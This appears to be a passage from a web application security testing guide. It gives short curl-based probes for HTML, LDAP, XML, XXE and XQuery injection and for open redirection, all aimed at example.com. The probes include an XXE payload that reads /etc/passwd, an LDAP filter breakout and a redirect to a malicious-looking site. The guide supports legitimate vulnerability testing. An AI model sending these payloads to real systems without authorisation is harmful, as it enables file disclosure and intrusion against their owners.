### Test for HTML Injection

HTML injection occurs when an attacker can inject HTML code into a web application. Test this by submitting a form with HTML tags:
```bash
curl -X POST -d "username=<b>Admin</b>" http://example.com/register
```
### Test for LDAP Injection

LDAP Injection occurs when untrusted input is used to construct LDAP queries. To test this, try:
```bash
curl "http://example.com/search?filter=(user=*))"
```
### Test for XML Injection

XML Injection occurs when user input is injected into an XML document. Test this by submitting XML data:
```bash
curl -X POST -d "<user><name>Attacker</name></user>" http://example.com/api
```
Check if the XML structure is altered.
### Test for XXE Injection

XML External Entity (XXE) Injection is a type of attack against an application that parses XML input. Test this with:
```bash
curl -X POST -d "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'file:///etc/passwd'> ]><foo>&xxe;</foo>" http://example.com/api
```
If it retrieves the contents of `/etc/passwd`, the application is vulnerable.
### Test for XQuery Injection

XQuery Injection occurs in systems using XQuery. Test this by injecting XQuery commands:
```bash
curl "http://example.com/api?query=for $x in doc('data.xml') return $x"
```
### Test for Open Redirection

Open Redirection vulnerabilities occur when an application redirects users to an external site. Test this by manipulating redirect parameters:
```bash
curl "http://example.com/redirect?url=http://malicious-site.com"

```
